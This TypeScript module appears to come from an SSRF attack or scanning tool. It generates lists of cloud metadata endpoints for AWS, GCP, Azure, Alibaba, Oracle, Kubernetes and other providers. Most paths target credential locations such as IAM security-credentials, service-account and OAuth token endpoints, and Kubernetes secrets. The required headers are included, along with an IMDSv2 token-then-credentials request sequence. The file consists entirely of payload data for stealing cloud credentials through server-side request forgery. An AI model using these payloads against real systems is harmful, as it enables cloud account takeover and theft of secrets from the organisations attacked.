export interface CloudMetadataTarget {
  provider: string;
  endpoint: string;
  paths: string[];
  requiredHeaders?: Record<string, string>;
}

export function generateCloudMetadataTargets(): CloudMetadataTarget[] {
  return [
    {
      provider: "AWS",
      endpoint: "169.254.169.254",
      paths: [
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data"
      ]
    },
    {
      provider: "GCP",
      endpoint: "metadata.google.internal",
      paths: [
        "/computeMetadata/v1/",
        "/computeMetadata/v1/instance/service-accounts/default/token",
        "/computeMetadata/v1/project/project-id"
      ],
      requiredHeaders: { "Metadata-Flavor": "Google" }
    },
    {
      provider: "Azure",
      endpoint: "169.254.169.254",
      paths: [
        "/metadata/instance?api-version=2021-02-01",
        "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
      ],
      requiredHeaders: { "Metadata": "true" }
    },
    {
      provider: "DigitalOcean",
      endpoint: "169.254.169.254",
      paths: [
        "/metadata/v1.json",
        "/metadata/v1/user-data"
      ]
    },
    {
      provider: "Alibaba",
      endpoint: "100.100.100.200",
      paths: [
        "/latest/meta-data/",
        "/latest/meta-data/ram/security-credentials/"
      ]
    },
    {
      // Oracle Cloud Infrastructure IMDS is link-local 169.254.169.254 (not 192.0.0.192).
      // Competitor table: Oracle | 169.254.169.254 | /opc/v2/instance/
      provider: "Oracle",
      endpoint: "169.254.169.254",
      paths: [
        "/opc/v1/instance/",
        "/opc/v2/instance/"
      ]
    },
    {
      provider: "Kubernetes API",
      endpoint: "kubernetes.default.svc",
      paths: [
        "/api/v1/namespaces/default/secrets",
        "/api/v1/namespaces/kube-system/secrets"
      ]
    },
    {
      provider: "Hetzner",
      endpoint: "169.254.169.254",
      paths: [
        "/metadata/v1/",
        "/metadata/v1/instance-id",
        "/metadata/v1/hostname"
      ]
    },
    {
      provider: "OpenStack/Nova",
      endpoint: "169.254.169.254",
      paths: [
        "/openstack/latest/",
        "/openstack/latest/meta_data.json"
      ]
    },
    {
      provider: "SoftLayer",
      endpoint: "169.254.169.254",
      paths: [
        "/rest/v1.1/",
        "/rest/v1.1/SoftLayer_Resource_Metadata"
      ]
    },
    {
      provider: "Linode",
      endpoint: "169.254.169.254",
      paths: [
        "/v1/",
        "/v1/instance",
        "/v1/region"
      ]
    },
    {
      provider: "Vultr",
      endpoint: "169.254.169.254",
      paths: [
        "/v1/",
        "/v1/meta-data",
        "/v1/user-data"
      ]
    },
    {
      provider: "ECS",
      endpoint: "100.100.100.200",
      paths: [
        "/latest/meta-data/",
        "/latest/meta-data/ram/security-credentials/"
      ]
    },
    {
      provider: "AWS IPv6",
      endpoint: "fd00:ec2::254",
      paths: [
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data"
      ]
    }
  ];
}

export interface ImdsV2Payload {
  step: string;
  url: string;
  method: string;
  headers: Record<string, string>;
}

export function generateImdsV2Payloads(ip: string): ImdsV2Payload[] {
  return [
    {
      step: "get-token",
      url: `http://${ip}/latest/api/token`,
      method: "PUT",
      headers: {
        "X-aws-ec2-metadata-token-ttl-seconds": "21600",
      },
    },
    {
      step: "get-credentials",
      url: `http://${ip}/latest/meta-data/iam/security-credentials/`,
      method: "GET",
      headers: {
        "X-aws-ec2-metadata-token": "_IMDSv2_TOKEN_PLACEHOLDER_",
      },
    },
  ];
}
